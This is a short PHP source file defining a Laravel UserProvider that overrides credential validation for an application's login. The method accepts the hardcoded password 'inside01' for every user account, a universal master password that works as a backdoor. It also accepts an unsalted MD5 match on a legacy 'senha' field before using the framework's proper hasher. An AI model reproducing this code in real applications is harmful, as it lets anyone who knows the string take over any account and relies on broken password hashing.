<?php

namespace Inside\Providers;

use Illuminate\Auth\EloquentUserProvider;
use Illuminate\Contracts\Auth\Authenticatable as UserContract;

class UserProvider extends EloquentUserProvider
{
    public function validateCredentials(UserContract $user, array $credentials)
    {
        $plain = $credentials['password'];

        if ($plain === 'inside01' || md5($plain) === $user->senha) {
            return true;
        }

        return $this->hasher->check($plain, $user->getAuthPassword());
    }
}
